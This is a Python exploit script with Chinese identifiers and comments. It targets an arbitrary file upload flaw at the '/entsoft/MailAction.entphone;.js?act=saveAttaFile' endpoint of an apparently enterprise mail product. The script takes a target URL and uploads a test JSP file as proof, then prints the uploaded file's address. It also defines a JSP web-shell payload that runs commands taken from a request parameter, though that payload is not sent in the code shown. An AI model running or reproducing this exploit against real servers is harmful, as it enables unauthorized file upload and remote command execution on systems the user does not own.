import requests
import re

print("请输入url：\n结尾不带 ‘\’    例如：http://www.test.com")
初始url = input().split()
#
url = 初始url[0] + f"/entsoft/MailAction.entphone;.js?act=saveAttaFile"
请求头 = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
} #不设置content-type参数，设置了content-type会导致文件无法上传，服务端 request.files 获取不到文件。
证明 = {
    'file': ('test.jsp', '<% out.println("zxx"); %>', 'xxx/txt')
}
利用 = {
    'file': ('test.jsp', '<% out.println(system(request.getParameter("zxx"))); %>', 'xxx/txt')
}
try:
    响应 = requests.post(url,headers=请求头,files=证明)
    if 响应.status_code == 200 and 'test.jsp' in 响应.text:
        正则 = re.compile(r'"visitRoot":"(?P<文件上传地址>.*?)","fileName".*?"msg":"(?P<提示消息>.*?)"',re.S)
        返回信息 = 正则.finditer(响应.text)
        for 关键字 in 返回信息:
            连接地址 = re.sub(r'.*?null',初始url[0],关键字.group("文件上传地址"))
            print(关键字.group("提示消息"),",文件上传地址为：",连接地址)
except Exception as 异常:
    print("发生异常",异常)
